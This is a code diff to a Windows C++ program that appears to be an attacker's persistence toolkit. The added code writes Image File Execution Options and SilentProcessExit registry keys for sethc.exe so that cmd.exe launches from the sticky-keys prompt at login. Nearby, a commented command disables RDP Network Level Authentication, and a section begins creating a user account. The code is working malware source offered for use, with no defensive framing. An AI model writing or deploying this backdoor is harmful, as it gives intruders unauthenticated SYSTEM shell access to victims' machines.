@@ -11,7 +11,9 @@
 int main()
 {
 	
-
+	/*-------------------------------------------------------------------------------------------*/
+	/*--------------------------   Persistent RDP / NLA Disabled   ------------------------------*/
+	/*-------------------------------------------------------------------------------------------*/
 
 	/*
 	LSTATUS RegOpenKeyExA(
@@ -106,13 +108,99 @@ int main()
 	
 	//system("start REG ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t reg_dword /d 0x00000000 /f");
 	
+	/*-------------------------------------------------------------------------------------------*/
+	/*--------------------------          sethc  standard         -------------------------------*/
+	/*-------------------------------------------------------------------------------------------*/
+	
+	/* https://wumb0.in/Writing-Me-Some-Windows-Malware.html */
+	
+	/*
+	HKEY debug_sethcKey;
+	
+	LPTSTR debugger_val;
+	debugger_val = LPTSTR(L"C:\\windows\\system32\\calc.msi");
+	DWORD debugger_len = lstrlen(debugger_val);
+	
+
+	//Sticky keys prompt
+	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe", NULL, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &debug_sethcKey, NULL != ERROR_SUCCESS)) {
+		printf("Sethc Key not created successfully\\n");
+	}
+	else {
+		if (RegSetValueEx(debug_sethcKey, L"Debugger", NULL, REG_SZ, (const BYTE*)debugger_val, debugger_len *2 ) != ERROR_SUCCESS) {
+			printf("Failed to set sethc key");
+		}
+	}
+	RegCloseKey(debug_sethcKey);
 	
 	
+	
+	*/
+	
+	
+	/*------------ CREATE GLOBAL FLAG-------------*/
+
+	/* https://wumb0.in/Writing-Me-Some-Windows-Malware.html */
+	/* https://www.programmersought.com/article/18196816141/ */
+
+
+	HKEY sethcKey;
+	
+	DWORD GLOBAL_lpd = MAX_PATH;
+	//DWORD GLOBALVal[MAX_PATH];
+	DWORD szType = REG_SZ;
+	DWORD new_GLOBAL_Val = 512;
+
+	//Sticky keys prompt
+	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe", NULL, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &sethcKey, NULL != ERROR_SUCCESS)) {
+		printf("Sethc Key not created successfully\\n");
+	}
+	else {
+		
+			if (RegSetValueEx(sethcKey, L"GlobalFlag", NULL, REG_DWORD, (const BYTE *)&new_GLOBAL_Val , sizeof(DWORD)) != ERROR_SUCCESS) {
+				printf("Failed to set sethc key");
+			}
+		
+		}
+	RegCloseKey(sethcKey);
+
+	/*------------ CREATE -------------*/
+
+	HKEY reporting_sethcKey;
+
+	DWORD reporting_lpd = MAX_PATH;
+	//DWORD GLOBALVal[MAX_PATH];
+	LPTSTR monitor_val;
+	
+
+	monitor_val = LPTSTR(L"C:\\windows\\system32\\cmd.exe");
+	DWORD len = lstrlen(monitor_val);
+	DWORD reporting_Val = 1;
+
+	//Sticky keys prompt
+	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SilentProcessExit\\\\sethc.exe", NULL, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reporting_sethcKey, NULL != ERROR_SUCCESS)) {
+		printf("Sethc Key not created successfully\\n");
+	}
+	else {
+
+		if (RegSetValueEx(reporting_sethcKey, L"ReportingMode", NULL, REG_DWORD, (const BYTE *)&reporting_Val, sizeof(DWORD)) != ERROR_SUCCESS) {
+			printf("Failed to set sethc key");
+		}
+
+		if (RegSetValueEx(reporting_sethcKey, L"MonitorProcess", NULL, REG_SZ, (LPBYTE)monitor_val, len * 2) != ERROR_SUCCESS) {
+			printf("Failed to set sethc key");
+		}
+	}
+	RegCloseKey(reporting_sethcKey);
+
+
+
 	/*-------------------------------------------------------------------------------------------*/
 	/*--------------------------           Create USER            -------------------------------*/
 	/*-------------------------------------------------------------------------------------------*/
 
 
+	
 		USER_INFO_1 ui;
 		DWORD dwLevel = 1;
 		DWORD dwError = 0;
